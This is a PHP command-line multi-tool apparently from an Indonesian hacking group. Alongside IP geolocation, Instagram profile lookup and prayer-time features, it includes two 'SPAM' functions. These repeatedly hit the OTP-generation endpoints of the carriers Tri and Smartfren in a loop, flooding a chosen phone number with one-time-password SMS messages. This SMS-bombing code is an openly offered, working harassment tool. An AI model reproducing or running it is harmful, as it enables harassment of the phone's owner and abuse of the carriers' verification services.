<?php
/*
    .:SIMPLETOOLS:.
        Crafted By Arikun - IndoSec

U Know ? This SCRIPT Has A Copyright ? PLEASE DON'T RECODE ! 
If U Want A Recode, Please ADD Real Author And Fork This Repo !

Regads, Arikun

Copyright(C)2020-2021 - Arikun
*/


function os()
{
	$os = PHP_OS;
	if ($os = "linux") {
		system("clear");
	}elseif ($os = "windows") {
		system("cls");
	}
}
function cekinet()
{
    echo "\n[+] Checking Your Internet Connection ...";

    $uri = get_headers('https://www.youtube.com');
    if (preg_match('/200/', $uri[0])) {
        echo "\n[+] Connection Stable\n";
        echo "Redirect... \n";
        sleep(3);
        os();
    }else{
       echo "\n\n[-] ERR_INTERNET_DISCONNECTED \n\n";
       exit();
   }
}

function index()
{
    cekinet();
    function listing(){
        echo "
        .:SIMPLE_TOOLS:.
        [ Crafted With ♥ By Arikun ]

        1.  IPGEO
        2.  SPAM THREE
        3.  SPAM SMARTFREN
        4.  INSTAINFO
        5.  JADWAL SHOLAT\n\n";
    }
    os();
    listing();
    echo "[~] Choose : ";$pilih = trim(fgets(STDIN));
// nomer 1
    if($pilih == 1){
        os();

        echo "
        .:IPGEO:. 
        Crafted By Arikun - IndoSec
        ___________________________\n";
        echo "Input URL(NO PROTOCOL) Or IP : "; $INP = trim(fgets(STDIN));
        echo "\n";
        function tested($INP)
        {

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/php/".$INP);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $asu = curl_exec($ch);

            $js = unserialize($asu);
            if($js['status'] == 'fail'){
                echo "[!] Sorry Check Your URL or IP Again, If you use a URL please Don't Use a Protocol (HTTPS:// or HTTP://)\n\n";
            }else{
                echo "Status    : " .$js['status']."\n";
                echo "Country   : " .$js['country']."\n";
                echo "City      : " .$js['city']."\n";
                echo "TimeZone  : " .$js['timezone']."\n";
                echo "ISP       : " .$js['isp']."\n";
                echo "ORG       : " .$js['org']."\n";
            }
        }

        tested($INP);

    }elseif($pilih == 2){
        os();

        echo "
        .:SPAM 3:. 
        Crafted By Arikun - IndoSec
        ___________________________\n";
        echo "Input Number (3)  : ";$number = trim(fgets(STDIN));
        echo "Input Total Mssg  : ";$total = trim(fgets(STDIN));

        function three($number, $total)
        {
            $url = "https://registrasi.tri.co.id/daftar/generateOTP";
            for ($i=1; $i<=$total; $i++){
                sleep(3);
                $ch = curl_init();
                CURL_SETOPT($ch, CURLOPT_URL, $url);
                CURL_SETOPT($ch, CURLOPT_POST, 1);
                CURL_SETOPT($ch, CURLOPT_POSTFIELDS, "msisdn=$number");
                CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, true);
                CURL_SETOPT($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla'));
                $exec = curl_exec($ch);
                curl_close($ch);
                $dec = json_decode($exec, true);
                if($dec['status'] == "success" ){
                    echo "[".$i."] ".$number." => SEND\n";
                } else {
                    echo "[".$i."] ".$number." => Failed!\n";
                }
            }   
        }

        three($number, $total);

    }elseif ($pilih == 4) {
        os();

        echo "
        .:INSTAINFO:. 
        Crafted By Arikun - IndoSec
        ___________________________\n";

        echo "Input Username : "; $username = trim(fgets(STDIN));
        echo "\n";
        if (!empty($username)) {
    # code...

            function insta($username)
            {

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/'.$username.'/?__a=1');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                $ex = curl_exec($ch);

                $js = json_decode($ex, 1);
    // kumpulin


                if(!empty($js)){
                    echo "Username  : @".$username."\n";
                    echo "Name      : ". $js['graphql']['user']['full_name']."\n";
                    echo "Follower  : ". number_format($js['graphql']['user']['edge_followed_by']['count'])."\n";
                    echo "Following : ". number_format($js['graphql']['user']['edge_follow']['count'])."\n";
                    echo "\n_______BIO_______\n". $js['graphql']['user']['biography']."\n";
                }else{
                    echo "OOOPPPSSS.. Your Input Was Wrong, Check Your Input Again Or Don't Add @ in username";
                }
            }
            insta($username);

        }else
        {
            echo "Sorry Your Action Not Running Because Username Not Found";
        }
    }elseif($pilih == 3){
        os();

        echo "
        .:SPAMFREN:. 
        Crafted By Arikun - IndoSec
        ___________________________\n";
        echo "Input Number ex(882xx)  : ";$number = trim(fgets(STDIN));
        echo "Input Total Mssg  : ";$total = trim(fgets(STDIN));
        echo "___________________________\n";
        function smartfren($number, $total)
        {
            $data = "mdn_ver=".$number;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://my.smartfren.com/modem_api/generate_otp');
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            CURL_SETOPT($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla'));

            $ex = curl_exec($ch);
            $js = json_decode($ex,1);
            if ($js['status_code'] == 999) {
                echo "[!] Sorry Your Action Has Error, Check Your Number Again Or Wait 10 Second To Try Again";
            }elseif ($js['status_code'] == 000) {
                for ($i=0; $i < $total ; $i++) { 
                    $ex = curl_exec($ch);
                    $js = json_decode($ex,1);
                    sleep(2);
                    echo "Success ".$i.",".$number."\n";
                }
            }
        }

        smartfren($number, $total);
    }elseif ($pilih == 5) {
        os();

        echo "
        .:JADWALSHOLAT:. 
        Crafted By Arikun - IndoSec
        ___________________________\n";
        echo "Input City    : ";$city = trim(fgets(STDIN));
        echo "___________________________\n";
        $date = date('Y-m-d');
        $agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36";

        if (!empty($city)) {
    # code...

            function city($city, $date,$agent)
            {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.pray.zone/v2/times/day.json?city='.$city.'&date='.$date);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, $agent);
                $ex = curl_exec($ch);
                $js = json_decode($ex,1);

                if ($js['code'] == 200) {
                    $status = "success";
                    $data = json_decode($ex);


                }else{
                    $status = "Fail";
                }
                echo "  [ INFORMATION ]\n";
                echo "Status        : ".$status."\n";
                echo "Juristic  : ".$js['results']['settings']['juristic']."\n";
                echo "Country   : ".$js['results']['location']['country']."\n";
                echo "TimeZone  : ".$js['results']['location']['timezone']."\n";
                echo "___________________________\n";
                echo "\n";
                foreach($data->results->datetime as $datetimes) {
                    $res = json_decode(json_encode($datetimes), 1);

                    echo "Imsyak        : ".$res['times']['Imsak']."\n";
                    echo "Sunrise       : ".$res['times']['Sunrise']."\n";
                    echo "Fajr      : ".$res['times']['Fajr']."\n";
                    echo "Dhuhr     : ".$res['times']['Dhuhr']."\n";
                    echo "Ashar     : ".$res['times']['Asr']."\n";
                    echo "Sunset        : ".$res['times']['Sunset']."\n";
                    echo "Maghrib       : ".$res['times']['Maghrib']."\n";
                    echo "Isha      : ".$res['times']['Isha']."\n";
                    echo "Midnight  : ".$res['times']['Midnight']."\n"; 
                }

            }

            city($city, $date, $agent);
        }else{
            echo "[!] Opps... Sorry Please Input Name Of City!";
        }
    }
}

index();
?>
